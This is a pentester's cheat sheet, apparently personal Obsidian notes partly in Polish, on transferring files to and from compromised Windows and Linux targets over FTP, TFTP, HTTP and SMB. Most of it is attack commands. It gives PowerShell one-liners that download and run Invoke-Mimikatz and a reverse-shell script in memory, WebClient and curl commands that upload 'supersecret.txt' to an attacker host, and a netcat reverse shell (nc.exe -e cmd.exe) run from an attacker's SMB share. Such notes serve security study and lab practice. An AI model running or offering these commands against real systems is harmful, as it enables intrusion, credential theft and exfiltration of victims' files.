

# Metasploit payload deploy 
![[Metasploit#Payload deploy]]

# (Almost) All The Ways to File Transfer
https://juggernaut-sec.com/linux-file-transfers-for-hackers/
https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
## GTFOBins / LOLBAS
Binarki Windows: https://lolbas-project.github.io/#/download
Binarki Linux: https://gtfobins.github.io/#+file%20download

# Transfering files to Targets
## terminal
```bash
# kompresja plików exe, -9 compress better
upx -9 nc.exe
exe2hex -x nc.exe -p nc.PS # -x <EXE_FILE> -p <OUT_AS_PS> / -b <OUT_AS_BAT>
less nc.PS # plix exe jako polecenie PS
cat nc.PS | tmux loadb - # załadowanie kemndy do bufora tmux
# można wkleić poprzez terminal, na maszynie powinien pojawić się plik nc.exe  

```
## FTP
```bash
auxiliary/server/ftp
set FTPROOT # folder na ktory,m ma działać server ftp

# ręcznie
cmd> ftp 192.168.100.100 # wchodzenie na server ftp
ftp>User: anonymous
ftp>(password: )
ftp> binary
ftp> get filename

# skrypt  w windows do automatyzacji ftp
cmd> ftp -s:ftp_commands.txt
# plik z poleceniami ftp_commands.txt
open 10.9.122.8
anonymous
whatever
binary
get met8888.exe
bye
```
## TFTP
```bash
auxiliary/server/tftp
set TFTPROOT # folder na ktory,m ma działać server ftp

# ręcznie
cmd> ftp 192.168.100.100 # wchodzenie na server ftp
ftp>User: anonymous
ftp>(password: )
ftp> binary
ftp> get filename
```
```PS
# enable tftp in Windows in command line
cmd> pkgmgr /iu:"TFTP"
tftp -i 192.168.10.10 GET/PUT password.txt
```
## HTTP
pobierz plik znajdujący się pod adresem http://10.10.10.10:1234/file.exe i nazwij go payload.exe 
```PowerShell
 # narzędzia do pobierania plików (jak curl)
 # pobierz plik na dysk
cmd> certutil -urlcache -f http://10.10.10.10:1234/file.exe payload.exe # cmd.exe

PS> IWR -Uri http://172.16.1.30/nc.exe -OutFile C:\temp\nc.exe # Powershell

PS> (new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe') # Powershell

curl.exe 172.16.1.30/wget.exe -o C:\temp\wget.exe


# POBIERZ I WYKONAJ W PAMIĘCI
# IEX is only useful for downloading and executing PS1 scripts and BATCH (.BAT) files into memory. This will NOT download and execute an EXE file into memory.
PS> IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.1.30/Invoke-Mimikatz.ps1') # Powershell

cmd> powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.1.30/Invoke-PowerShellTcp.ps1')"

```
Upload plików do atakującego
```Powershell
# wymaga włączonego serwera http z mozliwością uploadu
PS> (New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/', 'C:\temp\supersecret.txt')
# mając wgrany na serwer apache (/var/www/html) plik upload.php pozwaljący na upload plików
PS> (New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/upload.php', 'C:\temp\supersecret.txt')
cmd>powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/upload.php', 'C:\temp\supersecret.txt')"
cmd> curl.exe -F 'file=@C:\\temp\\supersecret.txt' http://172.16.1.30
cmd> curl.exe -F 'file=@C:\\temp\\supersecret.txt' http://172.16.1.30/upload.php

```

```bash
wget http://192.196.45.2/php-backdoor.php
curl ...
```
![[(reverse) shell#scp]]
### Python Web Server

```python
python -m SimpleHTTPServer 80 # python 2.x
python -m http.server 80 # python 3.x
```

## SMB
Pobierz pliki z serwera SMB
```powershell
cmd> copy \\172.16.1.30\hax\nc.exe C:\temp\nc.exe
```
Upload plików na serwer SMB
```powershell
cmd> copy C:\temp\supersecret.txt \\172.16.1.30\hax\supersecret.txt
```
Since Windows handles UNC paths, you can just treat the `hax` share as if it’s just a local folder from Windows. Basic Windows file commands like `dir`, `copy`, `move`, etc all just work
```powershell
cmd> net viev \\10.10.10.1 # chec share
cmd> dir \\10.10.10.1\hax # list content
```
### Python SMB Server
![[impacket#smbserver]]
```powershell
# kali attacker
$ impacket-smbserver smbfolder $(pwd) -smb2support -user vk9guest -password vk9pass

# W windows victim
PS> $pass = ConvertTo-SecureString ‘vk9pass’ -AsPlainText -Force
PS> $pass
PS> $cred = New-Object System.Management.Automation.PSCredential(‘vk9guest’, $pass)
PS> $cred
# tworzy nowy dysk wirtualny (PSDrive) o nazwie "vk9smb3"
PS> New-PSDrive -Name vk9smb -PSProvider FileSystem -Credential $cred -Root \\10.10.14.13\smbfolder
# -Root \\10.10.14.13\smbfolder określa lokalizację, która będzie punktem początkowym dla tego nowego dysku wirtualnego
PS> cd vk9smb:
PS> dir
PS> .\winPEASx64.exe # execute program
# If you need to mount multiple times use only a different name
PS> New-PSDrive -Name vk9smb2 -PSProvider FileSystem -Credential $cred -Root \\10.10.14.13\smbfolder
PS> New-PSDrive -Name vk9smb3 -PSProvider FileSystem -Credential $cred -Root \\10.10.14.13\smbfolder
```

### Executing Files Directly from Attacker’s SMB Server (NO TRANSFER NEEDED)
```powershell
\\172.16.1.30\hax\nc.exe 172.16.1.30 443 -e cmd.exe
```
## evil-winrm
![[evil-winrm#File transfer]]
# EXECUTING Files and Scripts in WINDOWS DIRECTLY from Attacker
## evil-winrm
![[evil-winrm#Executing Files and Scripts Directly from Attacker (NO TRANSFER NEEDED)]]
## PowerShell z SMB share
Uruchom zdalnie exe z SMB share 
https://community.spiceworks.com/topic/1999030-remotely-executing-an-application-from-smb-share

```powershell 
PS C:\Users\user> Invoke-Command -ComputerName target-computer -ScriptBlock{ 
$CurrentLocation = "\\server\share"
$exe = "application.exe "
$Arguments = "/S", "/qn" # change as needed
Start-Process -FilePath "$CurrentLocation\$exe" -ArgumentList $Arguments
}
```

```query
spawning TTY Shells 
```